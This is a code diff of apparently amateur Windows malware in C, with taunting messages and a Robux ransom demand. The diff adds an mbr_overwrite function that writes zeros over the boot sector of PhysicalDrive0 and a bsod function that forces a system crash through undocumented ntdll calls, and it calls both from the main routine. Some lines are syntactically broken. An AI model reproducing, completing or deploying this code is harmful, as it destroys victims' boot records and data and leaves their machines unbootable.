@@ -7,6 +7,7 @@
 
 typedef NTSTATUS(NTAPI *pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
 typedef NTSTATUS(NTAPI *pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
+#define BUFF_SIZE 512 //size of our data will be 512 coz MBR has 512 bytes and we want to overwrite all of its bytes.
 
 void lol()
 {
@@ -16,8 +17,6 @@ void lol()
         int duration = 3600000;
         char message[] = "you've been hacked by the pissy squad, if u don't giv us fre robuck the pissy squad will brick ur system 👿👿👿👿👿👿👿👿👿";
         ShellExecute(NULL, NULL, L"echo %c > README.txt", NULL, NULL, SW_HIDE, message);
-        infect();
-        escalateprivileges();
         maozedongthecompooter()
         Sleep(duration);
         ShellExecute(NULL, NULL, L"notepad", NULL, NULL, SW_SHOW);
@@ -38,7 +37,12 @@ void lol()
         SendMessage(edit, WM_CHAR, (TCHAR)'P', 0);
         Sleep(600) 
         MessageBox(NULL, "yer done BOIII", "yer done boi", MB_ICONEXCLAMATION | MB_OK);
+        mbr_overwrite();
+        Sleep(866);
+        bsod();
 }
+
+
 
 void maozedongthecompooter()
 {
@@ -209,7 +213,6 @@ void maozedongthecompooter()
                         ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
               } 
         }
-
         if(GetAsyncKeyState(VK_C) & 0x8000)
         {
               for(amount = 0; amount < 50; ++amount)
@@ -251,23 +254,35 @@ void maozedongthecompooter()
         }
 }
 
-void 
-
-void infect()
+void bsod()
 {
-        // Work in progress
+        BOOLEAN bEnabled;
+        ULONG uResp;
+        LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
+        LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
+        pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
+        pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
+        NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled); 
+        NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp); 
 }
 
-void escalateprivileges()
+void mbr_overwrite()
 {
-        // Work in progress
-}
+        HANDLE mbr = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); // handle 2 mbr real!!
 
+        if(mbr == INVALID_HANDLE_VALUE)
+        {
+            printf("damn it :C you survived, but you still have de viruz on ur system HAHA!");
+            ExitProcess(0);
+        }
 
+        const char trash_data[BUFF_SIZE]; // string (array of char's) in which we will store our data (bytes) to overwrite MBR
+        ZeroMemory(trash_data, BUFF_SIZE);
 
-void disable_cmdpromt()
-{
-        // Work in progress
+        if(WriteFile(mbr, trash_data, BUFF_SIZE, &written, NULL) == TRUE) //if our trial to overwrite MBR with our data worked (without errors) program will print
+        {                                                                 //MBR overwritten and exit
+            MessageBox(NULL, "lol get rekt nerd", "lol get rekt neerd skil isue", MB_ICONEXCLAMATION | MB_OK);
+        }
 }
 
 void disable_taskmgr()
